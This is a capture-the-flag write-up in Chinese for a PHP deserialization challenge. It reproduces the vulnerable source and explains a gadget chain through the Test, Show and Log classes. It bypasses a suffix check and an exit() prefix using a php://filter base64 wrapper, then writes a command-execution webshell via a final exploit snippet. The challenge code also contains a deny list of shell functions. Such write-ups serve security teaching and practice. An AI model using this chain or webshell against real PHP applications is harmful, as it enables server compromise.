# 电信初赛-快乐 pop

## 0x00 题面

题面如下:

```php
<?php
error_reporting(0);
class Test{
    public $check;
    public $registed;
    public function __construct($index){
        $this->check=$index;
    }
    public function __destruct()
    {
        if(!$this->registed){
            $this->check->index();  // 可控制, 入口点1
        }
    }
}

class Show{
      protected $logger;
      protected $key;
      protected $group;
      protected $expire;
      public function __construct($logger,$key='.log',$group,$expire=NULL){
          $this->group=$group;
          $this->key=$key;
          $this->logger=$logger;
        $this->expire=$expire;
      }
      public function __get($name){
          return $this->except[$name];
      }
      public function save(){
          $this->group->writelog($this->logger, $this->key, $this->group,$this->expire);
      }
      public function __call($name,$arguments){ // 利用2, $name="index"
        if($this->{$name}){
            $this->{$this->{$name}}($arguments);
        }
      }
}

class Log{
    public function getfilename($name,$expire){
        // 展示文件 后缀不能是php
        $cache_filename = $expire."./log/" . uniqid() . $name;
        if(substr($cache_filename, -strlen('.php')) === '.php') {
          die('no no no!!');
        }

        return $cache_filename;
    }
    public function getcontent($contents){
        $contents = "<?php exit() ?>".$contents;
        return $contents;
    }
    public function writelog($logger,$key,$group,$expire){
        $filename = $this->getfilename($key,$expire);
        $contents = $this->getcontent($logger);
        $result = file_put_contents($filename, $contents);
        if ($result){
            echo "ok";
        }else{
            echo "false";
        }

    }
}

class Conn {
  protected $conn;
  function __construct($dbuser, $dbpass, $db) {
    $this->conn = mysqli_connect("localhost", $dbuser, $dbpass, $db);
  }
  function get($lyrics) { // 传入id, 查找数据库并反序列化
    $r = array();
    foreach ($lyrics as $lyric) {
      $s = intval($lyric);
      $result = $this->conn->query("SELECT data FROM lyrics WHERE id=$s");
      while (($row = $result->fetch_row()) != NULL) {
          // 反序列化
        $r []= unserialize(base64_decode($row[0]));
      }
    }
    return $r;
  }
  function add($lyrics) { // 插入序列化的obj
    $ids = array();
    foreach ($lyrics as $lyric) {
      $this->conn->query("INSERT INTO lyrics (data) VALUES (\"" . base64_encode(serialize($lyric)) . "\")");
      $res = $this->conn->query("SELECT MAX(id) FROM lyrics");
      $id= $res->fetch_row(); $ids[]= intval($id[0]);
    }
    echo var_dump($ids);
    return $ids;
  }
  function __destruct() {
    $this->conn->close();
    $this->conn = NULL;
  }
};
function run($func, $p) {
        $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            $result = call_user_func($func, $p);
            $a= gettype($result);
             if ($a == "string") {
                  return $result;
               }
               else {return "";}
        }else {
            die("Hacker...");
        }
    }
$func = $_GET["func"];
$p = $_GET["p"];
$dir = "log/";
if (!is_dir($dir))
{
    mkdir($dir, 0755, true);
}
if($func && $p){
    run($func,$p);
}
else{
    highlight_file(__FILE__);
}

?>
```

## 0x01 思路

看题目名称, 这道题是 PHP 反序列化相关题目, 显然我们需要寻找代码中的魔法函数. 审计代码后, 发现用户比较好利用的魔法函数入口有`Conn`类和`Test`类的`__destruct`方法.
但是进一步分析发现, `Conn`类中的`$conn`参数无法被我们控制, 也没有可控制的方法. 因此我们看`Test`类

```php
class Test{
    public $check;
    public $registed;
    public function __construct($index){
        $this->check=$index;
    }
    public function __destruct()
    {
        echo "call Test.__destruct\n";
        if(!$this->registed){
            $this->check->index();  // 可控制, 入口点1
        }
    }
}
```

可以看到`$this->check->index();`这一行, 程序调用`$check`属性的`index()`方法, 这个时候就可以联想到, 如果调用某个类不存在方法, 会触发`__call()`魔法函数, 恰好`Show`类中有这么一个函数:

- `Show.`

```php
class Show{
    protected $logger;
      protected $key;
      protected $group;
      protected $expire;
      public $except = array("index" => "save");
      public function __construct($logger,$key='.log',$group,$expire=NULL){
          $this->group=$group;  // $group 为new Log()
          $this->key=$key;  // $key为文件名
          $this->logger=$logger; // $logger为文件内容的base64编码
        $this->expire=$expire; // $expire为php伪协议
      }
      public function __get($name){ // 利用3
          return $this->except[$name];  // 3.令$except为数组, $except['index']="save";
      }
      public function save(){  // 5. 令group为Log类, 则调用Log类的write方法
          $this->group->writelog($this->logger, $this->key, $this->group,$this->expire);
      }
      public function __call($name,$arguments){ // 利用2.1, $name="index"
        if($this->{$name}){ // 2.2 会调用__get, 返回$this->except[$name]
            $this->{$this->{$name}}($arguments); // 4令$except['index']="save"后, 则等价于调用$this->save(NULL)
        }
      }
}
```

进入`__call()`方法后, 首先会对`$this->{$name}`做判断, 此时从`Test`类过来的`$name='index'`, 显然`Show`类中没有`index`方法, 因此会触发`__get()`魔法方法, 而`__get()`方法会返回`$this->except[$name]`, 回到`__call()`后, 再以返回值作为方法名称进行调用.

而`Show`类中有`sava()`方法, 会通过`$group`属性调用`writelog()`方法, 恰巧在`Log`类中有该方法, 而且似乎可以写文件, 因此我们的思路就是利用`writelog()`方法去写 webshell, 我们来看`Log`类:

```php
<?php
class Log{
    public function getfilename($name,$expire){
        // 展示文件 后缀不能是php
        $cache_filename = $expire."./log/" . uniqid() . $name;
// uidfjdk/../filename.php
        // 这里只会检查$cache_filename的后四位, 使用/../filename.php/.即可绕过
        if(substr($cache_filename, -strlen('.php')) === '.php') {
          die('no no no!!');
        }

        return $cache_filename;
    }
    public function getcontent($contents){
        $contents = "<?php exit() ?>".$contents;
        return $contents;
    }
    public function writelog($logger,$key,$group,$expire){
        // 6. $key 为文件名, $expire为php伪协议, 绕过exit()函数
        $filename = $this->getfilename($key,$expire);
        $contents = $this->getcontent($logger);
        $result = file_put_contents($filename, $contents);
        if ($result){
            echo "ok";
        }else{
            echo "false";
        }

    }
}
```

要想走到`file_put_contents`去写文件, 需要过 2 个检查

1. `getfilename($name,$expire)`
   这里会检查`$name`的后四位是不是以`.php`结尾, 一般地如果中间件支持, 可以用`php3`, `php5`, `phtml`等后缀绕过, 在题目里我们使用`.php\.`绕过后缀检查, 而且还能保证被解析.
   此外, 程序还会在文件名前追加随机的字符, 这里可以使用`/../filename.php`绕过, 将随机字符视为目录, 再通过`../`访问上级目录.
   最终的`$name`应为`/../filename.php/.`

至于`$expire`的用法, 会在下面用到

2. `getcontent()`
   这里会在文件内容前追加`<?php exit() ?>`, 为了绕过, 我们使用 php 伪协议中的`filter`过滤链, 例如

```
php://filter/write=convert.base64-decode/resource=filename.php
```

使用 base64 的`filter`时, php 会跳过 base64 字符, 因此`<?php exit() ?>`就变成了`phpexit`7 个字符, 为了不造成错误, 在`$content`前追加一个字符, 即可使`$content`正常解析.
那么如何使用伪协议呢? 再次考察`getfilename($name,$expire)`, 文件名前方会拼接上`$expire`, 如果让`$expire=php://filter/write=convert.base64-decode/resource=`, 那么拼接之后文件名就是:

```
php://filter/write=convert.base64-decode/resource=./log/unknowid/../filename.php/.
```

再让`$content`为任意一个字母拼接上 php 一句话木马的 base64 即可. 例如

```
aPD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2MnXSk7ID8+
```

其中`base64.decode(PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2MnXSk7ID8+) = <?php echo system($_GET['c']); ?>`

### 0x02 编写 exp

回顾整个流程, 为了写入 webshell, 我们需要做如下工作

1. 构造一个`Test`类的对象`$test`, 在`$test`被销毁时触发`__destroy()`方法
2. 令`$test->register=false`, 进入`__destroy()`方法的`if`中
3. 为了调用`Show.__call()`, 令`$this->check`为`Show`类, 可以在构造的时候, 传入`Show`类的对象`$show`进行实例化
4. 为了让`Show.__get()`返回`sava`, 令`$show->except=array("index" => "save")`
5. 进入`sava()`方法后, 为了执行`Log.writelog()`, 令`$show->group`为`Log`类, 可以使用`Log`类的对象`$log`对`$show->group`进行赋值. `writelog()`的而参数该如何赋值?我们先看`writelog()`这个方法.
6. 进入`Log.writelog()`方法后, 需要让`$key=/../filename.php/.`, `$expire=php://filter/write=convert.base64-decode/resource=`作为参数进入`getfilename($name,$expire)`. 令`$logger='aPD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2MnXSk7ID8+'`, 让伪协议能够 base64 解码 webshell.
7. 因此, 在我们需要:

- `$show->logger='aPD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2MnXSk7ID8+'`
- `$show->key='/../filename.php/.'`
- `$show->group=new Log()`
- `$show->expire='php://filter/write=convert.base64-decode/resource='`

恰好, 以上参数可以通过`Show`的构造函数进行赋值, 于是 exp 如下:

```php
$show = new Show('qPD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2MnXSk7ID8+', '/../filename.php/.', new Log(), 'php://filter/write=convert.base64-decode/resource=');
$t = new Test('');
$t->registed = false;
$t->check=$show;

echo serialize(urlencode($t));
```
